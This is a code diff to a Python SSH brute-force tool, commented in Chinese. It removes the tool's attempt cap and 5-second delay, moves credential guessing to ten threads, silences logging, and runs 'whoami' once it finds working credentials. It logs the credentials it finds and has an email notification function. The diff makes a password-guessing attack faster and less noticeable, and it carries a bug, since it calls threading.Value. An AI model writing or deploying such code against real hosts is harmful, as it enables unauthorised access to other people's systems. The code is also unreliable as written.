@@ -14,14 +14,23 @@ from email.mime.text import MIMEText
 from email.header import Header
 from pathlib import Path
 import logging
+import warnings
+import threading
+from queue import Queue
+
+# 隐藏警告
+warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
 
 # 设置日志
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
+# 禁用 paramiko 的日志
+logging.getLogger("paramiko").setLevel(logging.CRITICAL)
+
 # 程序banner
 BANNER = """
 SSH连接工具
-版本: 1.6
+版本: 1.8
 时间: 2024/7/23
 """
 
@@ -43,10 +52,25 @@ def ssh_connect(hostname, port, username, password):
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        ssh_client.connect(hostname, port=port, username=username, password=password, timeout=10)
+        ssh_client.connect(hostname, port=port, username=username, password=password, timeout=5)
         return ssh_client
     except Exception:
         return None
+
+def worker(hostname, q, success_event, attempt_count):
+    while not q.empty() and not success_event.is_set():
+        username, password = q.get()
+        with attempt_count.get_lock():
+            attempt_count.value += 1
+        ssh_client = ssh_connect(hostname, 22, username, password)
+        if ssh_client:
+            stdin, stdout, stderr = ssh_client.exec_command('whoami', timeout=5)
+            print(stdout.read().decode('utf-8'))
+            ssh_client.close()
+            logging.info(f"连接成功！用户名: {username}, 密码: {password}")
+            logging.info(f"在成功之前失败了 {attempt_count.value - 1} 次")
+            success_event.set()
+        q.task_done()
 
 def ssh_client_connection(hostname):
     """尝试SSH客户端连接"""
@@ -55,36 +79,26 @@ def ssh_client_connection(hostname):
     with open("password.txt", 'r') as f:
         passwords = f.read().splitlines()
 
-    max_attempts = 50
-    attempt_count = 0
-    failed_attempts = 0
-
+    q = Queue()
     for username in usernames:
         for password in passwords:
-            if attempt_count >= max_attempts:
-                logging.warning(f"达到最大尝试次数 {max_attempts}，停止尝试")
-                logging.info(f"总共失败 {failed_attempts} 次")
-                return False
-            
-            ssh_client = ssh_connect(hostname, 22, username, password)
-            if ssh_client:
-                stdin, stdout, stderr = ssh_client.exec_command('whoami', timeout=10)
-                print(stdout.read().decode('utf-8'))
-                ssh_client.close()
-                logging.info(f"连接成功！用户名: {username}, 密码: {password}")
-                logging.info(f"在成功之前失败了 {failed_attempts} 次")
-                return True
-            
-            failed_attempts += 1
-            attempt_count += 1
-            
-            if attempt_count % 10 == 0:  # 每10次尝试报告一次
-                logging.info(f"已尝试 {attempt_count} 次，失败 {failed_attempts} 次")
-            
-            time.sleep(5)  # 在每次尝试之间添加5秒延迟
-    
-    logging.warning(f"所有组合都已尝试，连接失败。总共失败 {failed_attempts} 次")
-    return False
+            q.put((username, password))
+
+    success_event = threading.Event()
+    attempt_count = threading.Value('i', 0)
+    threads = []
+    for _ in range(10):  # 使用10个线程
+        t = threading.Thread(target=worker, args=(hostname, q, success_event, attempt_count))
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+
+    if not success_event.is_set():
+        logging.warning(f"所有组合都已尝试，连接失败。总共失败 {attempt_count.value} 次")
+
+    return success_event.is_set()
 
 def send_msg():
     """发送邮件通知"""
